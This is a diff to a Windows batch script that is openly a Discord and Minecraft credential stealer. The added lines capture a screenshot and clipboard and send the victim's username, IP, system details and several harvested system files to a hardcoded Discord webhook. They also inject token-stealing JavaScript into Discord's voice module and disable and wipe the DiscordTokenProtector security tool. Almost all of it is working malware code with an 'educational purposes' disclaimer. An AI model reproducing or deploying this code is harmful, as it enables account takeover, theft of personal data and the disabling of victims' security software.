@@ -1,9 +1,7 @@
 @echo off
+:: i dont take any responsibility for damage done with the programm it's for educational purposes only
+::replace the YOURWEBHOOK field with your webhook
 set webhook=https://discord.com/api/webhooks/935046615843106816/_mZ1X9R_ZG-tv8Zu1nQ6Fefihsdt-AUNVzFhOUjjhShOiQ0gnXiv9xzFht5VzLraNSot
-
-
-
-
 
 :check_Permissions
     
@@ -55,6 +53,50 @@ netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
 ::sends the launcher_accounts.json if minecraft exist
 if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end
+
+::makes and sends a screenshot
+echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
+echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
+echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
+echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
+echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
+echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
+echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
+echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
+echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
+timeout 1 >NUL
+Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
+
+::sends the username, ip, current time, and date of the victim
+
+
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+
+::sends all files
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
+ 
 
 ::grabbs the token
 
@@ -116,6 +158,49 @@ echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1
+
+set /a app = 0 
+set /a voice = 0
+if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
+:a
+if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
+set /a app=%app%+1
+if %app% == 10 goto c
+goto a
+:c
+set /a app=0 
+set /a voice=%voice%+1 
+if %voice% == 99 goto e
+goto a
+:b 
+echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
+if %killdc% == 1 goto d
+goto e
+:d
+::coded by baum#2873
+
+::DiscordTokenProtector Fucker
+taskkill /im Discord.exe /f
+taskkill /im DiscordTokenProtector.exe /f
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
+echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 
 ::deletes all temp files
 del %userprofile%\AppData\Local\Temp\ip.txt 
